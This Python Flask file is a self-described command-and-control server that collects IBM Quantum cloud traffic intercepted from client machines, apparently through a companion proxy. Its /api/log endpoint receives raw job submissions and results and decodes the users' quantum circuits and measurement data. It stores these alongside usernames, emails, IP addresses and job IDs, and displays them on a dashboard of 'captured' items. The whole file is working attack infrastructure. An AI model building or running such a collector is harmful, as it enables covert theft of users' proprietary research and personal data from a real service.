#!/usr/bin/env python3
"""
C2 Server for IBM Quantum Traffic Monitoring
Decodes raw data server-side (qiskit required here, not on client!)
"""
from flask import Flask, render_template, jsonify, request
from datetime import datetime
import json
import base64
import zlib
import io
import struct
import math
import re
from collections import Counter, deque

app = Flask(__name__)

# Data structures
jobs = {}  # job_id -> {circuit, results, metadata}
recent_activity = deque(maxlen=50)
stats = {
    'total_jobs': 0,
    'total_circuits_captured': 0,
    'total_results_captured': 0,
    'unique_clients': set(),
    'start_time': datetime.now().isoformat()
}


# ============================================
# DECODER CLASSES (SERVER-SIDE)
# ============================================

class QuantumResultsDecoder:
    """Server-side decoder for quantum results"""

    def __init__(self, compressed_data):
        self.compressed_data = compressed_data
        self.results = None
        self.num_qubits = None
        self._decode()

    def _decode(self):
        """Decode and decompress the quantum results"""
        try:
            decoded = base64.b64decode(self.compressed_data)
            decompressed = zlib.decompress(decoded)
            self.results = self._parse_npy(io.BytesIO(decompressed))
            max_val = max(self.results) if self.results else 0
            self.num_qubits = int(math.ceil(math.log2(max_val + 1))) if max_val > 0 else 1
        except Exception as e:
            raise ValueError(f"Failed to decode quantum results: {e}")

    def _parse_npy(self, file_obj):
        """Parse .npy file format"""
        magic = file_obj.read(6)
        if magic != b'\x93NUMPY':
            raise ValueError("Not a valid .npy file")

        major, _ = struct.unpack('BB', file_obj.read(2))

        if major == 1:
            header_len = struct.unpack('<H', file_obj.read(2))[0]
        else:
            header_len = struct.unpack('<I', file_obj.read(4))[0]

        header = file_obj.read(header_len).decode('latin1')
        dtype_match = re.search(r"'descr':\s*'([^']+)'", header)

        if not dtype_match:
            raise ValueError("Could not parse dtype from header")

        dtype_str = dtype_match.group(1)

        if dtype_str.startswith('<u') or dtype_str.startswith('|u'):
            byte_size = int(dtype_str[-1])
            is_unsigned = True
        elif dtype_str.startswith('<i') or dtype_str.startswith('|i'):
            byte_size = int(dtype_str[-1])
            is_unsigned = False
        else:
            raise ValueError(f"Unsupported dtype: {dtype_str}")

        data = file_obj.read()

        if byte_size == 1:
            fmt = 'B' if is_unsigned else 'b'
        elif byte_size == 2:
            fmt = 'H' if is_unsigned else 'h'
        elif byte_size == 4:
            fmt = 'I' if is_unsigned else 'i'
        elif byte_size == 8:
            fmt = 'Q' if is_unsigned else 'q'
        else:
            raise ValueError(f"Unsupported byte size: {byte_size}")

        num_elements = len(data) // byte_size
        fmt_str = '<' + fmt * num_elements
        results = list(struct.unpack(fmt_str, data))

        return results

    def to_binary_strings(self):
        """Convert measurement results to binary strings"""

        if not self.results:
            raise ValueError("Results are not available")

        return [format(val, f'0{self.num_qubits}b') for val in self.results]

    def get_counts(self):
        """Get histogram of measurement outcomes"""
        binary_strings = self.to_binary_strings()
        return dict(Counter(binary_strings))

    def get_probabilities(self):
        """Calculate measurement probabilities"""
        if not self.results:
            raise ValueError("Results are not available")

        counts = self.get_counts()
        total = len(self.results)
        return {state: count/total for state, count in counts.items()}

    def to_dict(self):
        """Export as dictionary"""
        if not self.results:
            raise ValueError("Results are not available")

        return {
            'num_qubits': self.num_qubits,
            'total_shots': len(self.results),
            'outcomes': sorted(set(self.results)),
            'state_counts': self.get_counts(),
            'probabilities': self.get_probabilities()
        }


class QuantumCircuitDecoder:
    """Server-side decoder for quantum circuits"""

    def __init__(self, encoded_data):
        self.encoded_data = encoded_data
        self.circuit = None
        self.circuit_info = None
        self._decode()

    def _decode(self):
        """Decode the quantum circuit"""
        try:
            raw = base64.b64decode(self.encoded_data)

            try:
                data = zlib.decompress(raw)
            except zlib.error:
                import gzip
                data = gzip.decompress(raw)

            try:
                from qiskit.qpy import load as qpy_load

                buf = io.BytesIO(data)
                circuits = list(qpy_load(buf))

                if circuits:
                    self.circuit = circuits[0]
                    self.circuit_info = self._extract_circuit_info()
                else:
                    self.circuit_info = {"error": "No circuits found in QPY data"}

            except ImportError:
                self.circuit_info = self._basic_parse(io.BytesIO(data))
            except Exception as e:
                self.circuit_info = {"error": f"QPY parsing error: {e}"}

        except Exception as e:
            self.circuit_info = {"error": f"Failed to decode: {e}"}

    def _extract_circuit_info(self):
        """Extract circuit information using qiskit"""
        gate_counts = {}

        if not self.circuit:
            raise ValueError("Circuit object is None")

        for instruction in self.circuit.data:
            gate_name = instruction.operation.name
            gate_counts[gate_name] = gate_counts.get(gate_name, 0) + 1

        try:
            diagram = str(self.circuit.draw(output='text', fold=-1))
        except:
            diagram = "Circuit diagram unavailable"

        return {
            'num_qubits': self.circuit.num_qubits,
            'num_clbits': self.circuit.num_clbits,
            'circuit_depth': self.circuit.depth(),
            'num_gates': len(self.circuit.data),
            'gate_breakdown': gate_counts,
            'circuit_diagram': diagram
        }

    def _basic_parse(self, buf):
        """Basic parsing when qiskit unavailable"""
        buf.seek(0, 2)
        total_size = buf.tell()
        return {
            'encoded_size_bytes': total_size,
            'message': 'Circuit captured but qiskit not available on C2 server'
        }

    def to_dict(self):
        """Export as dictionary"""
        return self.circuit_info


# ============================================
# EXTRACTION FUNCTIONS
# ============================================

def extract_circuit_data(raw_body):
    """Extract circuit from raw request body"""
    try:
        params = raw_body.get("params", {})
        pubs = params.get("pubs", [])

        for pub in pubs:
            if isinstance(pub, list) and len(pub) > 0:
                circuit_obj = pub[0]

                if isinstance(circuit_obj, dict) and circuit_obj.get("__type__") == "QuantumCircuit":
                    return circuit_obj.get("__value__")

        return None
    except Exception as e:
        print(f"   ⚠️ Error extracting circuit: {e}")
        return None


def extract_results_data(raw_body):
    """Extract results from raw response body"""
    try:
        pub_results = raw_body.get("__value__", {}).get("pub_results", [])

        for pub_result in pub_results:
            data_bin = (pub_result.get("__value__", {})
                       .get("data", {})
                       .get("__value__", {})
                       .get("fields", {}))

            for field_name, field_data in data_bin.items():
                if isinstance(field_data, dict):
                    if field_data.get("__type__") == "BitArray":
                        array_data = (field_data.get("__value__", {})
                                    .get("array", {})
                                    .get("__value__"))

                        if array_data and isinstance(array_data, str):
                            return array_data

        return None
    except Exception as e:
        print(f"   ⚠️ Error extracting results: {e}")
        return None


# ============================================
# FLASK ROUTES
# ============================================

@app.route('/')
def dashboard():
    """Main dashboard page"""
    return render_template('quantum_dashboard.html')


@app.route('/api/jobs')
def get_jobs():
    """Get all jobs organized by ID"""
    jobs_list = []
    for job_id, job_data in jobs.items():
        jobs_list.append({
            'job_id': job_id,
            **job_data
        })

    jobs_list.sort(key=lambda x: x.get('last_updated', ''), reverse=True)

    return jsonify({
        'jobs': jobs_list,
        'stats': {
            **stats,
            'unique_clients': list(stats['unique_clients'])
        }
    })


@app.route('/api/activity')
def get_activity():
    """Get recent activity feed"""
    return jsonify(list(recent_activity))


@app.route('/api/log', methods=['POST'])
def receive_log():
    """Receive raw data from client and decode it server-side"""
    try:
        data = request.get_json()

        if not data:
            return jsonify({'status': 'error', 'message': 'No data received'}), 400

        log_type = data.get('type')
        timestamp = data.get('timestamp', datetime.now().isoformat())
        client_ip = data.get('client_ip', 'unknown')

        stats['unique_clients'].add(client_ip)

        if log_type == 'job_submission_raw':
            print(f"\n📥 Received RAW job submission from {client_ip}")
            handle_raw_job_submission(data, timestamp, client_ip)

        elif log_type == 'job_results_raw':
            print(f"\n📥 Received RAW results from {client_ip}")
            handle_raw_results(data, timestamp, client_ip)

        else:
            print(f"⚠️  Unknown log type: {log_type}")
            return jsonify({'status': 'error', 'message': f'Unknown type: {log_type}'}), 400

        return jsonify({'status': 'success'}), 200

    except Exception as e:
        print(f"❌ Error receiving log: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'status': 'error', 'message': str(e)}), 500


def handle_raw_job_submission(data, timestamp, client_ip):
    """Decode raw job submission data SERVER-SIDE with REAL IBM Job ID"""
    raw_body = data.get('raw_body', {})
    username = data.get("username", "unknown")
    email = data.get("email", "unknown")

    # Extract metadata
    backend = raw_body.get('backend', 'unknown')
    shots = raw_body.get('shots', 'unknown')

    params = raw_body.get('params', {})
    if 'pubs' in params and len(params['pubs']) > 0:
        if isinstance(params['pubs'][0], list) and len(params['pubs'][0]) > 2:
            shots = params['pubs'][0][2]

    # Get the REAL IBM Job ID from the data
    job_id = data.get('job_id')

    if not job_id or job_id == 'unknown':
        print(f"   ⚠️ No valid job_id received, skipping...")
        return

    print(f"   Backend: {backend}, Shots: {shots}")
    print(f"   ✅ IBM Job ID: {job_id}")

    # Extract and DECODE circuit SERVER-SIDE
    circuit_data = extract_circuit_data(raw_body)

    if circuit_data:
        print(f"   🔍 Decoding circuit on C2 server...")
        try:
            decoder = QuantumCircuitDecoder(circuit_data)
            circuit_info = decoder.to_dict()
            print(f"   ✅ Circuit decoded!")
        except Exception as e:
            print(f"   ⚠️ Circuit decoding failed: {e}")
            circuit_info = {"error": str(e)}
    else:
        circuit_info = None

    # Create job entry with REAL IBM Job ID
    if job_id not in jobs:
        jobs[job_id] = {
            'circuit': None,
            'results': None,
            'metadata': {},
            'created_at': timestamp,
            'last_updated': timestamp,
            'client_ip': client_ip,
            'status': 'submitted',
            'username': username,
            'email': email
        }
        stats['total_jobs'] += 1

    jobs[job_id]['circuit'] = circuit_info
    jobs[job_id]['metadata'].update({
        'backend': backend,
        'shots': shots,
        'submission_url': data.get('url')
    })
    jobs[job_id]['last_updated'] = timestamp
    stats['total_circuits_captured'] += 1

    # Add to activity feed
    recent_activity.append({
        'type': 'circuit_captured',
        'timestamp': timestamp,
        'job_id': job_id,
        'client_ip': client_ip,
        'backend': backend,
        'num_qubits': circuit_info.get('num_qubits') if circuit_info else 'unknown'
    })


def handle_raw_results(data, timestamp, client_ip):
    """Decode raw results data SERVER-SIDE"""
    raw_body = data.get('raw_body', {})
    job_id = data.get('job_id')
    username = data.get("username"),
    email = data.get("email")

    if not job_id:
        print(f"   ⚠️  No job_id, creating orphan entry")
        job_id = f"orphan_{timestamp.replace(':', '_').replace('.', '_')}"

    # Extract and DECODE results SERVER-SIDE
    results_data = extract_results_data(raw_body)

    if results_data:
        print(f"   🔍 Decoding results on C2 server...")
        try:
            decoder = QuantumResultsDecoder(results_data)
            results_info = decoder.to_dict()
            print(f"   ✅ Results decoded!")
            print(f"   📊 Total shots: {results_info['total_shots']}")
        except Exception as e:
            print(f"   ⚠️ Results decoding failed: {e}")
            results_info = {"error": str(e)}
    else:
        results_info = None

    # Create or update job entry
    if job_id not in jobs:
        jobs[job_id] = {
            'circuit': None,
            'results': None,
            'metadata': {},
            'created_at': timestamp,
            'last_updated': timestamp,
            'client_ip': client_ip,
            'status': 'results_only',
            'username': username,
            'email': email
        }
        stats['total_jobs'] += 1

    jobs[job_id]['results'] = results_info
    jobs[job_id]['metadata'].update({
        'results_url': data.get('url'),
        'status_code': data.get('status_code')
    })
    jobs[job_id]['last_updated'] = timestamp
    jobs[job_id]['status'] = 'completed'
    stats['total_results_captured'] += 1

    # Add to activity feed
    recent_activity.append({
        'type': 'results_captured',
        'timestamp': timestamp,
        'job_id': job_id,
        'client_ip': client_ip,
        'total_shots': results_info.get('total_shots') if results_info else 'unknown',
        'num_states': len(results_info.get('state_counts', {})) if results_info else 0,
        'username': username,
        'email': email
    })


@app.route('/api/clear', methods=['POST'])
def clear_data():
    """Clear all data"""
    jobs.clear()
    recent_activity.clear()
    stats['total_jobs'] = 0
    stats['total_circuits_captured'] = 0
    stats['total_results_captured'] = 0
    stats['unique_clients'] = set()
    print("🗑️  All data cleared")
    return jsonify({'status': 'success'})


@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'uptime': datetime.now().isoformat(),
        'jobs_tracked': len(jobs)
    }), 200

import os

def replay_events_from_jsonl(path: str):
    if not os.path.exists(path):
        print(f"⚠️ Replay file not found: {path}")
        return

    print(f"📼 Replaying events from: {path}")
    loaded = 0

    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue

            try:
                data = json.loads(line)
            except Exception as e:
                print(f"⚠️ Bad JSON line skipped: {e}")
                continue

            log_type = data.get("type")
            timestamp = data.get("timestamp", datetime.now().isoformat())
            client_ip = data.get("client_ip", "replay")

            stats["unique_clients"].add(client_ip)

            if log_type == "job_submission_raw":
                handle_raw_job_submission(data, timestamp, client_ip)
                loaded += 1
            elif log_type == "job_results_raw":
                handle_raw_results(data, timestamp, client_ip)
                loaded += 1

    print(f"✅ Replay complete. Loaded {loaded} events.")

# import os
from flask import send_from_directory, abort

# Absolute path to the folder that contains c2_server.py and custom_proxy.py
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

@app.route('/static/<path:filename>')
def serve_static(filename):
    print(f"[static] Looking for: {filename}")
    print(f"[static] In directory: {BASE_DIR}")
    full_path = os.path.join(BASE_DIR, filename)
    print(f"[static] Full path: {full_path}")
    print(f"[static] Exists? {os.path.isfile(full_path)}")

    if not os.path.isfile(full_path):
        abort(404)
    return send_from_directory(BASE_DIR, filename)

if __name__ == '__main__':
    print("\n" + "="*80)
    print("🖥️  IBM Quantum C2 Server Starting...")
    print("="*80)
    # replay_path = os.environ.get("REPLAY_JSONL")

    # if replay_path:
        # replay_events_from_jsonl(replay_path)
    # Check qiskit availability
    try:
        import qiskit
        print("✅ Qiskit available - Full circuit decoding enabled")
    except ImportError:
        print("⚠️  Qiskit not found - Install with: pip3 install qiskit")
        print("   Circuit diagrams will not be available")

    print("📊 Dashboard: http://0.0.0.0:5000")
    print("📡 API Endpoint: http://0.0.0.0:5000/api/log")
    print("🎯 Server-side decoding: Clients send RAW data")
    print("="*80 + "\n")

    try:
        from waitress import serve
        print("🚀 Using Waitress production server")
        serve(app, host='0.0.0.0', port=5000, threads=4)
    except ImportError:
        print("⚠️  Waitress not available, using Flask dev server")
        app.run(host='0.0.0.0', port=5000, debug=True)
